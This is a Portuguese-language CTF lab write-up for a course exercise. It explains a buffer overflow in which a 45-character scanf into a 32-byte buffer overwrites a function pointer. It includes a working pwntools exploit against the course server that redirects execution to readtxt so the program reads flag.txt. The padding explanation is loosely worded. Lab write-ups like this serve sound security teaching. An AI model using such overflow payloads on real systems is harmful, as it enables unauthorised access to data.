# CTF Semana #5 (Buffer Overflow)

## Questões iniciais
1. Existe algum ficheiro que é aberto e lido pelo programa?
Sim, o programa abre e lê um ficheiro chamado rules.txt. Isso acontece na função readtxt, que utiliza o comando cat para exibir o conteúdo do ficheiro.
2. Existe alguma forma de controlar o ficheiro que é aberto?
O ponteiro da função fun pode ser alterado com um buffer overflow, o que permite manipular qual função será chamada e com quais argumentos.
3. Existe algum buffer overflow?
Sim, há um buffer overflow potencial na leitura de dados com scanf("%45s", &buffer);.
O buffer foi alocado com 32 bytes, mas o programa lê até 45 caracteres. Isto pode sobrescrever áreas de memória além do buffer, como o ponteiro da função fun.

## Exploit

exploit-template.py:
```
#!/usr/bin/python3
from pwn import *

r = remote('ctf-fsi.fe.up.pt', 4000)  # Se estiver se conectando ao servidor remoto

payload=b"flag\0" + b"a"*27 + b"\xa5\x97\x04\x08"

r.recvuntil(b"flag:\n")  # Espera até a parte que pede a entrada do usuário

r.sendline(payload)  # Envia o payload

# Recebe a resposta do programa, que deve ser a flag
buf = r.recv().decode()
print(buf)
```
to run: ./exploit-template.py

#### Explicação do payload:
**b"flag\0":** O programa vai ler esta string e passar como argumento para a função readtxt. Ou seja, tentamos fazer com que a função readtxt seja chamada com o argumento "flag", o que faz o programa tentar ler o ficheiro flag.txt. <br>
__b"a"*27__ Esta parte é usada para preencher o buffer até atingir a posição onde o ponteiro de função fun está armazenado na pilha. O buffer tem 32 bytes no total. Como o programa lê até 45 bytes (com o scanf("%45s", &buffer)), quando passamos 27 bytes de "a"s estamos a preencher os 27 primeiros bytes do buffer. Assim, os 5 bytes restantes serão utilizados para sobrescrever o endereço de retorno do ponteiro de função fun (no caso, o endereço que a função fun usará após o scanf). <br>
**b"\xa5\x97\x04\x08":** Este é o endereço da função readtxt em formato little-endian. O valor hexadecimal 0x080497a5 corresponde ao endereço da função readtxt em binário. Este endereço foi invertido porque nos sistemas little-endian, os bytes são armazenados de forma invertida na memória. Ao sobrescrever o ponteiro da função fun com esse valor, o programa vai chamar a função readtxt.<br>

#### Conclusão:
**Buffer Overflow:** Ao ultrapassar o tamanho do buffer com 27 "a"s, estamos a sobrescrever a posição de memória onde o ponteiro de função fun está armazenado.<br>
**Execução:** Ao substituir o ponteiro de função fun pelo endereço de readtxt, fazemos com que o programa execute a função readtxt com o argumento "flag", que irá ler o conteúdo de flag.txt em vez do rules.txt.